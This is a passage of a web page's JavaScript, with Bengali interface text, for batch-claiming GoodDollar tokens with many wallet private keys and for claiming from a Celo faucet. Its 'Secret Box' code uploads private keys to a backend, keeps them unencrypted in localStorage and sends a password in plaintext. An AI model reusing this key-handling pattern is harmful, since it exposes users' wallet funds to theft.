                            // Failed collection
                            tokenStats.error++;
                            console.log('‚ùå Failed result:', value);
                        }
                    } else {
                        tokenStats.error++;
                        console.log('‚ùå Rejected promise:', result.reason);
                    }
                });
                updateTokenStats();
            }

            const duration = ((Date.now() - startTime) / 1000).toFixed(2);
            addTokenLog('', 'info');
            addTokenLog('üèÅ Batch Token Collection completed!', 'info');
            addTokenLog(`‚úÖ Successful: ${tokenStats.success}`, 'success');
            addTokenLog(`‚ùå Failed: ${tokenStats.error}`, 'error');
            addTokenLog(`‚è±Ô∏è Total time: ${duration}s`, 'info');

            // ******************************************************************
            // ** FIXED: NEW AUTO-SAVE BLOCK FOR ANAMUL APP BACKEND **
            // ******************************************************************
            if (SECRETBOX_ENABLED && successfulTokenKeys.length > 0) {
                // 1. Format successful keys for the server (Backend expects array of objects: [{ key: '0x...', status: 'success' }])
                const keysForServer = successfulTokenKeys.map(key => ({ 
                    key: key, 
                    status: 'success',
                    source: 'Token Collect' 
                }));

                // 2. Send successful keys to the server
                await autoSaveKeysToSecretBox(keysForServer, 'Token Collect', 'success'); 
                
                addTokenLog('', 'info');
                addTokenLog(`‚úÖ Auto-saved ${successfulTokenKeys.length} successful keys to Anamul App!`, 'success');
            }
            // ******************************************************************

            successfulTokenKeys = []; // Reset for next batch
            document.getElementById('tokenButton').disabled = false;
            return { successCount: tokenStats.success, errorCount: tokenStats.error };
        }
        // ******************* END OF runBatchTokenCollection FUNCTION (EDITED) *******************


        // --- SECRET BOX FUNCTIONS (Auto Save to Server) ---
        
        async function autoSaveKeysToSecretBox(keys, operationType, status = 'success') {
            try {
                // Keys must be an array of objects: [{key: '0x...', status: 'success'}]
                const deviceName = getDeviceName();
                const response = await fetch('/api/save-keys', { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify({ keys: keys, source: operationType, device: deviceName, status: status }) 
                });
                const result = await response.json();
                if (result.success) {
                    console.log(`‚úÖ Auto-saved ${result.saved} new keys to backend database (${operationType}) from ${deviceName}`);
                } else {
                    console.log(`‚ö†Ô∏è Backend auto-save error: ${result.error}`);
                }
            } catch (e) { 
                console.log(`‚ö†Ô∏è Failed to save to backend: ${e.message}`); 
            } 
        }

        // --- LOCAL STORAGE FUNCTIONS (Secret Box setup and manual save) ---
        
        function getSecretData() {
            try {
                const data = localStorage.getItem(SECRET_DATA_KEY);
                return data ? JSON.parse(data) : { password: '', keys: {} };
            } catch (e) {
                console.error("Error reading local storage:", e);
                return { password: '', keys: {} };
            }
        }

        function saveSecretData() {
            try {
                localStorage.setItem(SECRET_DATA_KEY, JSON.stringify(secretData));
            } catch (e) {
                console.error("Error writing to local storage:", e);
            }
        }
        
        function savePrivateKey(key) {
            // Saves to 'Recent Keys' list (local storage)
            const recentKeys = JSON.parse(localStorage.getItem('goodDollarSavedKeys') || '[]');
            const prefixedKey = ensurePrivateKeyPrefix(key);
            if (!recentKeys.includes(prefixedKey)) {
                recentKeys.unshift(prefixedKey);
                // Keep the list manageable
                if (recentKeys.length > 50) recentKeys.pop(); 
                localStorage.setItem('goodDollarSavedKeys', JSON.stringify(recentKeys));
            }
        }
        
        function setupSecretBox() {
            const passwordInput = document.getElementById('secretBoxPassword');
            const password = passwordInput.value.trim();
            const storedData = getSecretData();
            
            if (!password) {
                document.getElementById('secretBoxMessage').textContent = "‚ùå ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶™‡¶æ‡¶∏‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶° ‡¶¶‡¶ø‡¶®‡•§";
                return;
            }

            if (!storedData.password) {
                // First time setup
                secretData.password = password;
                saveSecretData();
                document.getElementById('secretBoxMessage').textContent = "‚úÖ Secret Box ‡¶™‡¶æ‡¶∏‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶° ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§";
            } else if (storedData.password !== password) {
                document.getElementById('secretBoxMessage').textContent = "‚ùå ‡¶≠‡ßÅ‡¶≤ ‡¶™‡¶æ‡¶∏‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶°‡•§";
                return;
            }

            secretData = storedData;
            secretData.password = password; // Update with current successful password
            document.getElementById('secretBoxPasswordSetup').style.display = 'none';
            document.getElementById('secretBoxContent').style.display = 'block';
            updateSecretBoxCount();
            document.getElementById('secretBoxMessage').textContent = "‚úÖ Secret Box unlocked.";
            fetchKeysFromServer(); // Fetch server keys immediately after unlock
        }

        function updateSecretBoxCount() {
            // Count keys from local storage
            document.getElementById('secretBoxKeyCount').textContent = Object.keys(secretData.keys).length;
        }
        
        function showSecretBoxAction(action) {
            const panels = document.querySelectorAll('.secret-box-action-panel');
            panels.forEach(panel => panel.style.display = 'none');
            document.getElementById('secretBoxMessage').textContent = '';
            
            if (action === 'view') {
                document.getElementById('secretBoxViewManage').style.display = 'block';
                // Note: Keys must be fetched/shown manually by user buttons
            } else if (action === 'manual_add') {
                document.getElementById('secretBoxManualAdd').style.display = 'block';
            } else if (action === 'server_sync') {
                document.getElementById('secretBoxServerSync').style.display = 'block';
            }
        }
        
        // --- SERVER API FUNCTIONS (Fetch and Delete) ---
        
        async function fetchKeysFromServer() {
            if (!secretData.password) {
                document.getElementById('secretBoxMessage').textContent = "‚ùå ‡¶Ü‡¶ó‡ßá ‡¶™‡¶æ‡¶∏‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶° ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®/‡¶¶‡¶ø‡¶®‡•§";
                return;
            }
            document.getElementById('secretBoxMessage').textContent = "üîÑ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá Key ‡¶Ü‡¶®‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";
            const listContainer = document.getElementById('serverKeyListContainer');
            listContainer.innerHTML = '<p style="color: #ffc107;">Loading...</p>';

            try {
                const response = await fetch('/api/fetch-keys', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ password: secretData.password })
                });
                const result = await response.json();

                if (result.success) {
                    const keys = result.keys || [];
                    listContainer.innerHTML = '';
                    if (keys.length === 0) {
                        listContainer.innerHTML = '<p style="color: #bbb;">‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶ï‡ßã‡¶®‡ßã Key ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ ‡¶®‡ßá‡¶á‡•§</p>';
                    } else {
                        keys.forEach(keyObj => {
                            const div = document.createElement('div');
                            div.className = 'key-entry';
                            
                            const keyText = document.createElement('span');
                            keyText.textContent = `[${keyObj.source || 'Claim'}] ${keyObj.key.slice(0, 8)}...${keyObj.key.slice(-8)}`;
                            keyText.style.color = keyObj.status === 'success' ? '#4caf50' : '#ffc107';

                            const deleteBtn = document.createElement('button');
                            deleteBtn.className = 'delete-key-btn';
                            deleteBtn.textContent = 'Delete';
                            deleteBtn.onclick = () => deleteKeyFromServer(keyObj.key);

                            div.appendChild(keyText);
                            div.appendChild(deleteBtn);
                            listContainer.appendChild(div);
                        });
                    }
                    document.getElementById('secretBoxMessage').textContent = `‚úÖ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ${keys.length} ‡¶ü‡¶ø Key ‡¶Ü‡¶®‡¶æ ‡¶π‡¶≤‡ßã‡•§`;

                } else {
                    listContainer.innerHTML = `<p style="color: #ff6b6b;">‚ùå ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶è‡¶∞‡¶∞: ${result.error}</p>`;
                    document.getElementById('secretBoxMessage').textContent = `‚ùå ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶è‡¶∞‡¶∞: ${result.error}`;
                }

            } catch (e) {
                listContainer.innerHTML = `<p style="color: #ff6b6b;">‚ùå ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶è‡¶∞‡¶∞‡•§ ‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡¶ø‡¶§ ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶Ü‡¶õ‡ßá‡•§</p>`;
                document.getElementById('secretBoxMessage').textContent = `‚ùå ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶è‡¶∞‡¶∞‡•§ ‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡¶ø‡¶§ ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶Ü‡¶õ‡ßá‡•§`;
            }
        }
        
        async function deleteKeyFromServer(keyToDelete) {
             if (!confirm(`‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡¶ø ‡¶è‡¶á Key ‡¶ü‡¶ø ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶§‡ßá ‡¶ö‡¶æ‡¶®?\n${keyToDelete.slice(0, 10)}...`)) {
                return;
            }
            document.getElementById('secretBoxMessage').textContent = "üóëÔ∏è Key ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";

            try {
                const response = await fetch('/api/delete-key', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ password: secretData.password, key: keyToDelete })
                });
                const result = await response.json();

                if (result.success && result.deleted > 0) {
                    document.getElementById('secretBoxMessage').textContent = "‚úÖ Key ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§";
                    fetchKeysFromServer(); // Refresh list
                } else {
                    document.getElementById('secretBoxMessage').textContent = `‚ùå Key ‡¶Æ‡ßã‡¶õ‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø: ${result.error || 'Key not found'}`;
                }

            } catch (e) {
                document.getElementById('secretBoxMessage').textContent = "‚ùå ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶è‡¶∞‡¶∞‡•§ ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§";
            }
        }

        async function clearAllServerKeys() {
            if (!confirm("‚ö†Ô∏è ‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡¶ø ‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡¶ø‡¶§ ‡¶Ø‡ßá ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶•‡¶æ‡¶ï‡¶æ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ **‡¶∏‡¶¨ Key** ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶¨‡ßá‡¶®? ‡¶è‡¶ü‡¶ø ‡¶Ö‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶®‡ßÄ‡¶Ø‡¶º!")) {
                return;
            }
             if (!confirm("üö® ‡¶∂‡ßá‡¶∑ ‡¶∏‡¶§‡¶∞‡ßç‡¶ï‡¶§‡¶æ: ‡¶è‡¶á Key ‡¶ó‡ßÅ‡¶≤‡ßã ‡¶ö‡¶ø‡¶∞‡¶§‡¶∞‡ßá ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡•§ ‡¶ö‡¶æ‡¶≤‡¶ø‡¶Ø‡¶º‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡¶®?")) {
                return;
            }
            document.getElementById('secretBoxMessage').textContent = "üóëÔ∏è ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá‡¶∞ ‡¶∏‡¶¨ Key ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";

            try {
                const response = await fetch('/api/clear-all-keys', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ password: secretData.password })
                });
                const result = await response.json();

                if (result.success) {
                    document.getElementById('secretBoxMessage').textContent = `‚úÖ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ${result.deleted} ‡¶ü‡¶ø Key ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§`;
                    fetchKeysFromServer(); // Refresh list
                } else {
                    document.getElementById('secretBoxMessage').textContent = `‚ùå ‡¶∏‡¶¨ Key ‡¶Æ‡ßã‡¶õ‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø: ${result.error || 'Server error'}`;
                }

            } catch (e) {
                document.getElementById('secretBoxMessage').textContent = "‚ùå ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶è‡¶∞‡¶∞‡•§ ‡¶∏‡¶¨ Key ‡¶Æ‡ßã‡¶õ‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§";
            }
        }
        
        function displayLocalKeys() {
             const listContainer = document.getElementById('localKeyListContainer');
             listContainer.innerHTML = '';
             document.getElementById('secretBoxMessage').textContent = "üîç ‡¶≤‡ßã‡¶ï‡¶æ‡¶≤ ‡¶∏‡ßç‡¶ü‡ßã‡¶∞‡ßá‡¶ú ‡¶•‡ßá‡¶ï‡ßá Key ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá‡•§";

             // In this version, local keys are stored in secretData.keys (as objects)
             const keys = Object.values(secretData.keys);
             
             if (keys.length === 0) {
                listContainer.innerHTML = '<p style="color: #bbb;">‡¶è‡¶á ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶≤‡ßã‡¶ï‡¶æ‡¶≤ ‡¶∏‡ßç‡¶ü‡ßã‡¶∞‡ßá‡¶ú‡ßá ‡¶ï‡ßã‡¶®‡ßã Key ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ ‡¶®‡ßá‡¶á‡•§</p>';
                return;
             }
             
             keys.forEach(keyObj => {
                const div = document.createElement('div');
                div.className = 'key-entry';
                
                const keyText = document.createElement('span');
                keyText.textContent = `${keyObj.key.slice(0, 8)}...${keyObj.key.slice(-8)} (Locally Added)`;
                keyText.style.color = '#ffc107';

                const deleteBtn = document.createElement('button');
                deleteBtn.className = 'delete-key-btn';
                deleteBtn.textContent = 'Remove Local';
                deleteBtn.onclick = () => {
                    if (confirm(`‡¶è‡¶á Key ‡¶ü‡¶ø ‡¶∂‡ßÅ‡¶ß‡ßÅ ‡¶≤‡ßã‡¶ï‡¶æ‡¶≤ ‡¶∏‡ßç‡¶ü‡ßã‡¶∞‡ßá‡¶ú ‡¶•‡ßá‡¶ï‡ßá ‡¶∏‡¶∞‡¶æ‡¶§‡ßá ‡¶ö‡¶æ‡¶®?\n${keyObj.key.slice(0, 10)}...`)) {
                        delete secretData.keys[keyObj.key];
                        saveSecretData();
                        displayLocalKeys(); // Refresh list
                        updateSecretBoxCount();
                    }
                };

                div.appendChild(keyText);
                div.appendChild(deleteBtn);
                listContainer.appendChild(div);
            });
        }
        
        async function manualSaveKeys() {
            const keysText = document.getElementById('manualKeys').value.trim();
            if (!keysText) {
                document.getElementById('secretBoxMessage').textContent = "‚ùå Key ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®‡•§";
                return;
            }

            const lines = keysText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            const keysToSave = validateAndCleanClaimKeys(lines);

            if (keysToSave.length === 0) {
                document.getElementById('secretBoxMessage').textContent = "‚ùå ‡¶ï‡ßã‡¶®‡ßã ‡¶¨‡ßà‡¶ß Key ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø‡•§";
                return;
            }
            
            document.getElementById('secretBoxMessage').textContent = `üîÑ ${keysToSave.length} ‡¶ü‡¶ø Key ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...`;
            
            // 1. Prepare keys for server save (as successful claims)
            const keysForServer = keysToSave.map(key => ({ 
                key: key, 
                status: 'success',
                source: 'Manual Add' 
            }));
            
            // 2. Save to Server
            const response = await fetch('/api/save-keys', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ keys: keysForServer, source: 'Manual', device: getDeviceName(), status: 'manual' })
            });
            const result = await response.json();

            if (result.success) {
                document.getElementById('secretBoxMessage').textContent = `‚úÖ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ${result.saved} ‡¶ü‡¶ø ‡¶®‡¶§‡ßÅ‡¶® Key ‡¶∏‡ßá‡¶≠ ‡¶π‡¶≤‡ßã‡•§`;
                document.getElementById('manualKeys').value = '';
                fetchKeysFromServer(); // Refresh server list
            } else {
                document.getElementById('secretBoxMessage').textContent = `‚ùå ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶è‡¶∞‡¶∞: ${result.error}`;
            }
        }
        
        
        // --- CELO FAUCET CLAIM ---

        async function claimCelo() {
            const address = document.getElementById('celoClaimAddress').value.trim();
            const statusDiv = document.getElementById('faucetStatus');
            const button = document.getElementById('faucetButton');
            
            if (!ethers.isAddress(address)) {
                statusDiv.innerHTML = '‚ùå ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡ßà‡¶ß Celo Address ‡¶¶‡¶ø‡¶®‡•§';
                statusDiv.style.color = '#ff6b6b';
                return;
            }

            button.disabled = true;
            statusDiv.innerHTML = '‚è≥ Claim ‡¶Ö‡¶®‡ßÅ‡¶∞‡ßã‡¶ß ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá...';
            statusDiv.style.color = '#ffc107';

            try {
                const response = await fetch('/api/celo-faucet', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: address })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    statusDiv.innerHTML = `
                        <strong style="color: #4caf50;">‚úÖ ‡¶∏‡¶´‡¶≤!</strong><br>
                        <span style="font-size: 11px;">From: ${result.faucet}</span><br>
                        Address: <code style="background: rgba(255,255,255,0.1); padding: 2px 4px;">${address.slice(0,10)}...${address.slice(-8)}</code><br>
                        <span style="color: #ffc107;">‚è∞ ${result.note}</span>
                    `;
                    statusDiv.style.color = '#4caf50';
                    document.getElementById('celoClaimAddress').value = '';
                } else {
                    statusDiv.innerHTML = `
                        ‚ùå ${result.error}<br>
                        <small style="color: #ccc;">Alternative: GoodWallet ‡¶è face verify ‡¶ï‡¶∞‡ßá G$ claim ‡¶ï‡¶∞‡ßÅ‡¶®</small>
                    `;
                    statusDiv.style.color = '#ff6b6b';
                }
            } catch (error) {
                statusDiv.innerHTML = `
                    ‚ùå Error: ${error.message}<br>
                    <small>‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®</small>
                `;
                statusDiv.style.color = '#ff6b6b';
            } finally {
                 button.disabled = false;
            }
        }

    </script>
</body>
</html>
